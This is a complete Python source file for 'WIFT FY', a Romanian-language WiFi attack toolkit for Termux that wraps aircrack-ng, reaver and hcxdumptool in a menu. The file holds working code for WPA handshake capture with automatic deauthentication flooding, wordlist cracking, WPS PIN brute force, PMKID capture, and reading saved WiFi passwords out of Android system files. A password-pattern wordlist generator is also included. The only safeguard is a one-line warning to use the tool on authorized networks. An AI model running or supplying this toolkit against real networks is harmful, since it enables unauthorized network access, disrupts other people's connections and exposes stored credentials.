#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  WIFT FY v2.0 — WiFi Auditing Toolkit (Termux Edition)
#  Creat de: TinKode
#  Python 3 — doar stdlib (fara pachete pip)
#  Dependențe Termux validate:
#    pkg install root-repo && pkg install -y aircrack-ng iw tsu coreutils
#    pkg install tur-repo && pkg install -y reaver            (optional WPS)
#    pkg install tur-repo && pkg install -y hcxdumptool hcxtools (optional PMKID)
# ============================================================

import os
import re
import sys
import csv
import glob
import time
import shutil
import threading
import subprocess
import xml.etree.ElementTree as ET

VERSION = "2.0"
AUTHOR = "TinKode"
TOOL = "WIFT FY"
OUTDIR = os.path.join(os.path.expanduser("~"), "wiftfy")


class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; CY = "\033[96m"; W = "\033[97m"; D = "\033[90m"
    BD = "\033[1m";  RS = "\033[0m"


BANNER = (
    C.M + C.BD +
    "\n _   _  ___  _____  _____  __   __\n"
    "| | | ||_ _||  ___||  ___| \\ \\ / /\n"
    "| |_| | | | | |_   | |_     \\ V /\n"
    "|  _  | | | |  _|  |  _|     | |\n"
    "|_| |_||___||_|    |_|       |_|\n" +
    C.RS + C.CY + C.BD +
    "\n   [ WiFi Auditing Toolkit — Termux Edition ]\n" +
    C.RS + C.Y +
    "   v" + VERSION + " — " + C.BD + "Creat de " + C.G + AUTHOR + C.RS + "\n" +
    C.D + "   Python 3 (stdlib) + aircrack-ng (root-repo)\n" + C.RS
)


# Dependențe: unealta -> (repo, pachet Termux)
TERMUX_DEPS = {
    "aircrack-ng": ("root-repo", "aircrack-ng"),
    "airodump-ng": ("root-repo", "aircrack-ng"),
    "aireplay-ng": ("root-repo", "aircrack-ng"),
    "airmon-ng":   ("root-repo", "aircrack-ng"),
    "iw":          ("standard",  "iw"),
    "tsu":         ("standard",  "tsu"),
    "timeout":     ("standard",  "coreutils"),
}
TERMUX_OPT = {
    "reaver":      ("tur-repo", "reaver",              "Atac WPS"),
    "hcxdumptool": ("tur-repo", "hcxdumptool",         "Atac PMKID"),
    "hcxpcaptool": ("tur-repo", "hcxtools",            "Convertor PMKID"),
    "ethtool":     ("standard", "ethtool",             "Info retea (optional)"),
}


def run(cmd, capture=False):
    try:
        if capture:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return p.stdout or ""
        return subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        return "" if capture else None


def is_root():
    try:
        if os.geteuid() == 0:
            return True
    except AttributeError:
        pass
    return bool(shutil.which("tsu") or shutil.which("su"))


def fix_aircrack_lib():
    """Repara bug-ul cunoscut din Termux: 'libaircrack-ce-wpa.so not found'."""
    prefix = os.environ.get("PREFIX", "/data/data/com.termux/files/usr")
    libdir = os.path.join(prefix, "lib")
    dst = os.path.join(libdir, "libaircrack-ce-wpa.so")
    if not os.path.isdir(libdir) or os.path.exists(dst):
        return
    for f in sorted(os.listdir(libdir)):
        if re.match(r"libaircrack-ce-wpa.*\.so$", f):
            try:
                os.symlink(os.path.join(libdir, f), dst)
                print(C.G + "[✓] Reparat: libaircrack-ce-wpa.so → " + f + C.RS)
            except OSError:
                pass
            return


def quick_check():
    missing, names = [], set()
    for tool, (repo, pkg) in TERMUX_DEPS.items():
        if not shutil.which(tool):
            missing.append(tool)
            names.add(pkg)
    return missing, sorted(names)


def check_deps():
    print(C.Y + "\n[*] Dependențe obligatorii (validate pentru Termux):" + C.RS)
    missing = set()
    for tool, (repo, pkg) in TERMUX_DEPS.items():
        ok = shutil.which(tool)
        status = (C.G + "[✓]" + C.RS) if ok else (C.R + "[✗]" + C.RS)
        if not ok:
            missing.add(pkg)
        print("  %-12s %s  pachet Termux: %s%s%s (%s)" % (tool, status, C.W, pkg, C.RS, repo))
    print(C.Y + "\n[*] Dependențe opționale:" + C.RS)
    for tool, (repo, pkg, desc) in TERMUX_OPT.items():
        ok = shutil.which(tool)
        status = (C.G + "[✓]" + C.RS) if ok else (C.D + "[✗]" + C.RS)
        src = ("pkg install %s && pkg install %s" % (repo, pkg)) if (pkg and not ok) else "—"
        print("  %-12s %s  %-22s %s%s%s" % (tool, status, desc, C.D, src, C.RS))
    fix_aircrack_lib()
    if missing:
        print(C.R + "\n[!] Lipsește: " + C.W + ", ".join(sorted(missing)) + C.RS)
        print(C.Y + "    Instalează: pkg install root-repo && pkg install -y " + " ".join(sorted(missing)) + C.RS)
    else:
        print(C.G + "\n[✓] Toate dependențele obligatorii sunt instalate și valide pentru Termux." + C.RS)


def install_deps():
    print(C.G + "[*] pkg update && pkg upgrade ..." + C.RS)
    run("pkg update -y && pkg upgrade -y")
    print(C.G + "[*] Adaug root-repo (aircrack-ng) ..." + C.RS)
    run("pkg install -y root-repo")
    print(C.G + "[*] Instalez aircrack-ng iw tsu coreutils ..." + C.RS)
    run("pkg install -y aircrack-ng iw tsu coreutils")
    fix_aircrack_lib()
    yn = input(C.Y + "[?] Instalez reaver (atac WPS, din tur-repo)? (y/N): " + C.RS).strip().lower()
    if yn == "y":
        run("pkg install -y tur-repo && pkg install -y reaver")
    yn = input(C.Y + "[?] Instalez hcxdumptool + hcxtools (atac PMKID, din tur-repo)? (y/N): " + C.RS).strip().lower()
    if yn == "y":
        run("pkg install -y tur-repo && pkg install -y hcxdumptool hcxtools")
    print(C.G + "\n[+] Gata. Rulează cu root: tsu python3 wifi" + C.RS)


def list_ifaces():
    out = run("iw dev 2>/dev/null", capture=True)
    res = []
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            parts = line.split()
            if len(parts) >= 2:
                res.append(parts[1])
    return res


def get_iface():
    ifaces = list_ifaces()
    if ifaces:
        print(C.G + "[*] Interfețe detectate: " + C.W + ", ".join(ifaces) + C.RS)
    while True:
        i = input(C.Y + "[?] Interfață WiFi (ex: wlan0): " + C.RS).strip()
        if i:
            return i
        if ifaces:
            return ifaces[0]


def start_mon(iface):
    print(C.G + "[*] Activez modul monitor pe " + iface + " ..." + C.RS)
    run("airmon-ng start " + iface + " 2>&1")
    time.sleep(3)
    for i in list_ifaces():
        if "mon" in i:
            print(C.G + "[+] Monitor activ: " + i + C.RS)
            return i
    print(C.Y + "[!] Fără interfață 'mon' explicită; folosesc " + iface + C.RS)
    return iface


def stop_mon(mon):
    run("airmon-ng stop " + mon + " 2>&1")
    print(C.D + "[*] Mod monitor oprit." + C.RS)


def require_monitor():
    if not is_root():
        print(C.R + "[!] Necesită ROOT. Rulează: tsu python3 wifi" + C.RS)
        print(C.D + "    (instalează tsu: pkg install tsu)" + C.RS)
        return False
    print(C.G + "[✓] Root detectat." + C.RS)
    return True


def scan_networks():
    if not require_monitor():
        return
    iface = get_iface()
    mon = start_mon(iface)
    try:
        print(C.G + "[*] Scanare rețele... Ctrl+C pentru oprire." + C.RS)
        run("airodump-ng " + mon + " --ignore-negative-one")
    finally:
        stop_mon(mon)


def pick_target(mon):
    os.makedirs(OUTDIR, exist_ok=True)
    prefix = os.path.join(OUTDIR, "scan")
    print(C.G + "[*] Scanare 25s pentru lista de rețele..." + C.RS)
    run("timeout 25 airodump-ng " + mon + " --ignore-negative-one -w " + prefix +
        " --output-format csv --write-interval 1 >/dev/null 2>&1")
    nets = []
    csvs = sorted(glob.glob(prefix + "*.csv"))
    if csvs:
        try:
            with open(csvs[0], "r", errors="ignore", newline="") as f:
                rows = list(csv.reader(f))
        except Exception:
            rows = []
        started = False
        for row in rows:
            if row and row[0].strip().upper().startswith("BSSID"):
                started = True
                continue
            if started and (not row or not row[0].strip()):
                break
            if started and len(row) > 13:
                bssid, ch, enc = row[0].strip(), row[3].strip(), row[5].strip()
                essid = row[13].strip().strip('"')
                if bssid and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid, re.I):
                    nets.append((bssid, ch, enc, essid or "(hidden)"))
    if not nets:
        print(C.R + "[!] Nicio rețea detectată." + C.RS)
        return None
    print(C.Y + "\n  #  |  BSSID              |  CH |  Criptare      |  ESSID" + C.RS)
    print(C.Y + "-----+---------------------+-----+----------------+------------------" + C.RS)
    for i, (bssid, ch, enc, essid) in enumerate(nets):
        print(C.W + "  %2d | %s | %3s | %-14s | %s" % (i, bssid, ch, enc[:14], essid) + C.RS)
    while True:
        try:
            sel = int(input(C.Y + "\n[?] Alege numărul țintei: " + C.RS))
            if 0 <= sel < len(nets):
                return nets[sel]
        except (ValueError, KeyboardInterrupt):
            pass
        print(C.R + "[!] Selecție invalidă." + C.RS)


def has_handshake(cap):
    out = run("aircrack-ng '" + cap + "' 2>/dev/null", capture=True)
    m = re.search(r"\[\d+:\d+:\d+\]\s+(\d+)(?:/\d+)?\s+WPA\s+handshake", out, re.I)
    if not m:
        m = re.search(r"\[\d+:\d+:\d+\]\s+(\d+)(?:/\d+)?\s+handshake", out, re.I)
    return bool(m and int(m.group(1)) > 0)


def save_password(bssid, pwd):
    try:
        path = os.path.join(OUTDIR, "saved.txt")
        with open(path, "a") as f:
            f.write("%s | %s | %s\n" % (time.strftime("%Y-%m-%d %H:%M"), bssid, pwd))
        print(C.G + "[+] Parola salvată în: " + path + C.RS)
    except OSError as e:
        print(C.D + "[!] Nu am putut salva: " + str(e) + C.RS)


def crack_live(cap, bssid, wl):
    print(C.G + "[*] Cracare cu wordlist-ul: " + wl + C.RS)
    p = subprocess.Popen("aircrack-ng -w '" + wl + "' -b " + bssid + " '" + cap + "'",
                         shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    out = ""
    try:
        for line in p.stdout:
            print(line, end="")
            out += line
    except KeyboardInterrupt:
        p.kill()
    p.wait()
    m = re.search(r"KEY FOUND!\s*\[\s*([^\]]+?)\s*\]", out)
    if m:
        print(C.G + C.BD + "\n[+] PAROLA WIFI: " + m.group(1) + C.RS)
        save_password(bssid, m.group(1))
        return m.group(1)
    print(C.R + "[!] Parola nu a fost găsită în wordlist." + C.RS)
    return None


def choose_wordlist():
    default = os.path.join(OUTDIR, "wordlist.txt")
    while True:
        wl = input(C.Y + "[?] Wordlist (" + default + "): " + C.RS).strip() or default
        if os.path.isfile(wl):
            return wl
        yn = input(C.Y + "[?] '" + wl + "' nu există. O generez acum? (y/N): " + C.RS).strip().lower()
        if yn == "y":
            gen_wordlist(wl)
            if os.path.isfile(wl):
                return wl
        else:
            return None


def wpa_attack():
    if not require_monitor():
        return
    iface = get_iface()
    mon = start_mon(iface)
    try:
        tgt = pick_target(mon)
        if not tgt:
            return
        bssid, ch, enc, essid = tgt
        print(C.G + "[*] Țintă: " + essid + " (" + bssid + ") pe canalul " + ch + " [" + enc + "]" + C.RS)
        wl = choose_wordlist()
        if not wl:
            return
        safe = re.sub(r"\W+", "_", essid)[:20] or bssid.replace(":", "")
        prefix = os.path.join(OUTDIR, "cap_" + safe)
        print(C.G + "[*] Captură (90s) + deauth pentru forțarea handshake-ului..." + C.RS)

        def dumper():
            run("timeout 90 airodump-ng " + mon + " --ignore-negative-one -c " + ch +
                " --bssid " + bssid + " -w " + prefix + " --output-format pcap --write-interval 1 >/dev/null 2>&1")

        t = threading.Thread(target=dumper, daemon=True)
        t.start()
        time.sleep(6)
        deadline = time.time() + 75
        got = False
        while time.time() < deadline:
            time.sleep(4)
            caps = sorted(glob.glob(prefix + "*.cap"))
            if caps and has_handshake(caps[0]):
                got = True
                break
            print(C.D + "[*] Trimit deauth... aștept handshake..." + C.RS)
            run("aireplay-ng --deauth 5 -a " + bssid + " " + mon + " --ignore-negative-one >/dev/null 2>&1")
        t.join(timeout=3)
        caps = sorted(glob.glob(prefix + "*.cap"))
        if got and caps:
            print(C.G + "[+] Handshake capturat!" + C.RS)
            crack_live(caps[0], bssid, wl)
        else:
            print(C.R + "[!] Handshake necapturat în timp util." + C.RS)
            if caps:
                print(C.D + "    .cap rămâne salvat — îl poți craka offline cu opțiunea 4." + C.RS)
    finally:
        stop_mon(mon)


def deauth_attack():
    if not require_monitor():
        return
    iface = get_iface()
    mon = start_mon(iface)
    try:
        bssid = input(C.Y + "[?] BSSID țintă (AA:BB:CC:DD:EE:FF): " + C.RS).strip()
        if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid, re.I):
            print(C.R + "[!] BSSID invalid." + C.RS)
            return
        try:
            cnt = int(input(C.Y + "[?] Nr. pachete deauth (10): " + C.RS).strip() or "10")
        except ValueError:
            cnt = 10
        print(C.G + "[*] Deauth x" + str(cnt) + " către " + bssid + "... (Ctrl+C pentru oprire)" + C.RS)
        run("aireplay-ng --deauth " + str(cnt) + " -a " + bssid + " " + mon + " --ignore-negative-one")
    finally:
        stop_mon(mon)


def offline_crack():
    cap = input(C.Y + "[?] Cale către fișierul .cap: " + C.RS).strip()
    if not os.path.isfile(cap):
        print(C.R + "[!] Fișier inexistent." + C.RS)
        return
    bssid = input(C.Y + "[?] BSSID țintă (gol = toate): " + C.RS).strip()
    wl = choose_wordlist()
    if not wl:
        return
    opt = "-b " + bssid if bssid else ""
    run("aircrack-ng -w '" + wl + "' " + opt + " '" + cap + "'")


def wps_attack():
    if not require_monitor():
        return
    if not shutil.which("reaver"):
        print(C.R + "[!] reaver lipsește. Instalează: pkg install tur-repo && pkg install reaver" + C.RS)
        return
    iface = get_iface()
    mon = start_mon(iface)
    try:
        bssid = input(C.Y + "[?] BSSID țintă: " + C.RS).strip()
        ch = input(C.Y + "[?] Canal (gol = auto): " + C.RS).strip()
        opt = "-c " + ch if ch else ""
        print(C.G + "[*] Atac WPS bruteforce PIN pe " + bssid + "... (poate dura mult)" + C.RS)
        run("reaver -i " + mon + " -b " + bssid + " " + opt + " -vv -K 1 -N --ignore-locks")
    finally:
        stop_mon(mon)


def pmkid_attack():
    if not require_monitor():
        return
    if not shutil.which("hcxdumptool"):
        print(C.R + "[!] hcxdumptool lipsește. Instalează: pkg install tur-repo && pkg install hcxdumptool hcxtools" + C.RS)
        return
    iface = get_iface()
    mon = start_mon(iface)
    try:
        out_pcap = os.path.join(OUTDIR, "pmkid.pcapng")
        print(C.G + "[*] Captur PMKID cu hcxdumptool (Ctrl+C după 30-60s)..." + C.RS)
        run("hcxdumptool -i " + mon + " -o " + out_pcap + " --enable_status=1")
        if not os.path.isfile(out_pcap) or os.path.getsize(out_pcap) == 0:
            print(C.R + "[!] Fără captură. AP-ul țintă trebuie să suporte PMKID." + C.RS)
            return
        h22000 = os.path.join(OUTDIR, "pmkid.22000")
        print(C.G + "[*] Convertesc în format hashcat (.22000)..." + C.RS)
        run("hcxpcaptool -z " + h22000 + " " + out_pcap)
        if os.path.isfile(h22000) and os.path.getsize(h22000) > 0:
            print(C.G + "[+] Hash PMKID salvat: " + h22000 + C.RS)
            if shutil.which("hashcat"):
                wl = choose_wordlist()
                if wl:
                    run("hashcat -m 22000 " + h22000 + " " + wl)
            else:
                print(C.Y + "[*] hashcat nu e disponibil în Termux (limitare OpenCL)." + C.RS)
                print(C.Y + "    Copiază " + h22000 + " pe PC și rulează: hashcat -m 22000 pmkid.22000 wordlist.txt" + C.RS)
        else:
            print(C.R + "[!] Fără hash PMKID în captură." + C.RS)
    finally:
        stop_mon(mon)


def parse_wificonfigstore(path):
    try:
        root = ET.parse(path).getroot()
    except Exception as e:
        print(C.R + "[!] Eroare parsare " + path + ": " + str(e) + C.RS)
        return
    found = 0
    for wifi in root.iter("WifiConfiguration"):
        cfg = {}
        for s in wifi.iter("string"):
            name, txt = s.get("name"), s.text or ""
            if name in ("ConfigKey", "SSID", "PreSharedKey", "psk"):
                cfg[name] = txt.strip().strip('"')
        ssid = cfg.get("SSID") or cfg.get("ConfigKey") or ""
        psk = cfg.get("PreSharedKey") or cfg.get("psk") or ""
        if ssid and psk and psk.upper() not in ("NULL", "NONE"):
            print(C.G + "  [SSID] " + ssid + "   [PAROLA] " + psk + C.RS)
            found += 1
    if not found:
        print(C.D + "  (niciun PSK salvat în acest fișier)" + C.RS)


def parse_supplicant(path):
    found = 0
    try:
        with open(path, "r", errors="ignore") as f:
            data = f.read()
    except Exception:
        return
    for block in re.findall(r"network=\{.*?\}", data, re.S):
        ssid = re.search(r'ssid="([^"]*)"', block)
        psk = re.search(r'psk="([^"]*)"', block)
        if ssid and psk:
            print(C.G + "  [SSID] " + ssid.group(1) + "   [PAROLA] " + psk.group(1) + C.RS)
            found += 1
    if not found:
        print(C.D + "  (niciun PSK în wpa_supplicant.conf)" + C.RS)


def saved_wifi():
    print(C.Y + "[*] Parole WiFi salvate pe dispozitiv (necesită root):" + C.RS)
    if not is_root():
        print(C.R + "[!] Necesită root. Rulează: tsu python3 wifi" + C.RS)
        return
    paths = [
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/misc/wifi/WifiConfigStoreSoftwares.xml",
        "/data/misc/wifi/wpa_supplicant.conf",
    ]
    found_any = False
    for p in paths:
        if os.path.isfile(p):
            print(C.B + "\n[*] " + p + C.RS)
            if p.endswith(".conf"):
                parse_supplicant(p)
            else:
                parse_wificonfigstore(p)
            found_any = True
    if not found_any:
        print(C.R + "[!] Nu am găsit fișiere WiFi accesibile (verifică root-ul / permisiunile)." + C.RS)


def gen_wordlist(path=None):
    if path is None:
        path = input(C.Y + "[?] Cale output (" + OUTDIR + "/wordlist.txt): " + C.RS).strip() \
               or os.path.join(OUTDIR, "wordlist.txt")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    base = input(C.Y + "[?] Cuvinte de bază (separate prin spațiu): " + C.RS).split()
    if not base:
        print(C.R + "[!] Ai nevoie de cel puțin un cuvânt de bază." + C.RS)
        return
    years = input(C.Y + "[?] Ani (ex: 2020-2026, gol = nimic): " + C.RS).strip()
    years_l = []
    if years and "-" in years:
        try:
            a, b = years.split("-")
            years_l = [str(y) for y in range(int(a), int(b) + 1)]
        except ValueError:
            pass
    words = set()
    for w in base:
        words.update([w, w.capitalize(), w.upper(), w.lower()])
        for y in years_l:
            words.update([w + y, w.capitalize() + y, y + w, w + "@" + y])
        for d in range(100):
            words.add(w + str(d).zfill(2))
            words.add(w + str(d))
        words.add(w + "!")
        words.add(w + "123")
        words.add(w + "@")
    with open(path, "w") as f:
        for w in sorted(words):
            f.write(w + "\n")
    print(C.G + "[+] Wordlist generat: " + path + " (" + str(len(words)) + " cuvinte)" + C.RS)


def about():
    print(BANNER)
    print(C.W +
          "\n  Funcții:\n"
          "   • Scanare rețele WiFi\n"
          "   • Atac WPA/WPA2: captură handshake + crack (deauth automat)\n"
          "   • Atac deautentificare (deauth)\n"
          "   • Cracare offline din .cap\n"
          "   • Atac WPS (reaver)\n"
          "   • Atac PMKID (hcxdumptool)\n"
          "   • Extragere parole WiFi salvate (root)\n"
          "   • Generator de wordlist-uri\n"
          "   • Verificare/instalare dependențe Termux\n" +
          C.R + "\n  Avertisment: " + C.W +
          "Folosește DOAR pe rețele proprii sau pentru care ai autorizație.\n" + C.RS)


MENU = (
    C.CY + C.BD + "\n╔═══════════════════════════════════════════════╗\n"
    "║         WIFT FY — MENIU PRINCIPAL          ║\n"
    "╠═══════════════════════════════════════════════╣\n"
    "║  1 │ Scanare rețele WiFi                     ║\n"
    "║  2 │ Atac WPA/WPA2 (handshake + crack)       ║\n"
    "║  3 │ Atac deautentificare (deauth)           ║\n"
    "║  4 │ Cracare offline (.cap + wordlist)       ║\n"
    "║  5 │ Atac WPS (reaver)                       ║\n"
    "║  6 │ Atac PMKID (hcxdumptool)                ║\n"
    "║  7 │ Parole WiFi salvate (root)              ║\n"
    "║  8 │ Generează wordlist                      ║\n"
    "║  9 │ Verifică dependențe (Termux)            ║\n"
    "║ 10 │ Instalează dependențe (Termux)          ║\n"
    "║ 11 │ Despre                                  ║\n"
    "║  0 │ Ieșire                                  ║\n"
    "╚═══════════════════════════════════════════════╝" + C.RS
)


def main():
    os.makedirs(OUTDIR, exist_ok=True)
    print(BANNER)
    missing, names = quick_check()
    if missing:
        print(C.R + "[!] Dependențe Termux lipsă: " + C.W + ", ".join(missing) + C.RS)
        print(C.Y + "    → opțiunea 10 (instalare automată) sau:" + C.RS)
        print(C.Y + "      pkg install root-repo && pkg install -y " + " ".join(names) + C.RS)
    else:
        print(C.G + "[✓] Dependențele Termux sunt instalate și valide." + C.RS)
    if not is_root():
        print(C.Y + "[!] Fără root — atacurile (1-6) necesită: tsu python3 wifi" + C.RS)

    while True:
        try:
            print(MENU)
            opt = input(C.Y + "[?] Alegere: " + C.RS).strip()
            if opt == "1":   scan_networks()
            elif opt == "2": wpa_attack()
            elif opt == "3": deauth_attack()
            elif opt == "4": offline_crack()
            elif opt == "5": wps_attack()
            elif opt == "6": pmkid_attack()
            elif opt == "7": saved_wifi()
            elif opt == "8": gen_wordlist()
            elif opt == "9": check_deps()
            elif opt == "10": install_deps()
            elif opt == "11": about()
            elif opt == "0":
                print(C.G + "\n[+] La revedere. — Creat de " + AUTHOR + C.RS)
                sys.exit(0)
            else:
                print(C.R + "[!] Opțiune invalidă." + C.RS)
        except KeyboardInterrupt:
            print(C.D + "\n[*] Înapoi la meniu (Ctrl+C)." + C.RS)
            continue


if __name__ == "__main__":
    main()
